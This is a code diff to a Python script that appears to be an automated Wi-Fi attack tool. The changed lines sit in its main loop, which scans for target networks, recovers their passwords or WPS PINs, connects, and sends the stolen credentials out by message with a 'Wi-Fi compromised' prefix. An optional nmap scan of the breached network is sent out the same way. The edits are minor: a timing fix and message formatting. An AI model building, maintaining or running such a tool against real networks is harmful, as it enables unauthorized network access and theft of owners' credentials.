@@ -32,7 +32,7 @@ wait_for_time_sync()
 logging.info("Time was synchronized with NTP.")
 
 # Set global timer after time sync
-global_start_time = time.time()
+global_start_time = time.monotonic()
 
 # Clean up Wi-Fi state
 delete_all_wifi_connections()
@@ -47,7 +47,7 @@ targets = scan_targets(ATTACK_INTERFACE)
 
 # Attack loop
 while targets:
-    if time.time() - global_start_time > MAX_RUNTIME:
+    if time.monotonic() - global_start_time > MAX_RUNTIME:
         logging.warning("Max runtime exceeded. Exiting.")
         break
 
@@ -57,13 +57,13 @@ while targets:
     if result:
         connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
         if connected:
-            msg = f"[+] Target compromised:\nSSID: {essid}"
+            msg = f"[+]\nSSID: {essid}"
             if result.get("psk"):
                 msg += f"\nPassword: {result['psk']}"
             elif result.get("pin"):
                 msg += f"\nWPS PIN: {result['pin']}"
 
-            send_message(msg)
+            send_message(msg, prefix="[Wi-Fi compromised]")
 
             if ENABLE_NMAP_SCAN:
                 ip = get_wifi_ip(ATTACK_INTERFACE)
@@ -72,7 +72,7 @@ while targets:
                     nmap_result = run_nmap_scan(ip)
                     if nmap_result:
                         cleaned_output = clean_nmap_output(nmap_result)
-                        send_message(f"[nmap scan result]\n```{cleaned_output}```")
+                        send_message(cleaned_output, prefix="[nmap scan result]")
                 else:
                     logging.warning("No IP assigned to interface. Skipping nmap scan.")
 
